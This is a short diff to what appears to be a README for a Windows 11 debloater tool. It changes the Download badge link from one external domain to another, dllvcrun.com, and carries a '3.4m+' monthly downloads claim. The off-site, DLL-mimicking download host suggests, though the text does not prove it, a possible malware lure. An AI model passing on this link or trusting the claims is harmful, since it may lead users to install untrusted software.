@@ -49,7 +49,7 @@ A: Yes — disables all Windows diagnostic data collection.
 
 **Monthly downloads:** 3.4m+
 
-[![Download](https://img.shields.io/badge/Download-v6.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/win11debloater)
+[![Download](https://img.shields.io/badge/Download-v6.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/win11debloater)
 
 ---
 
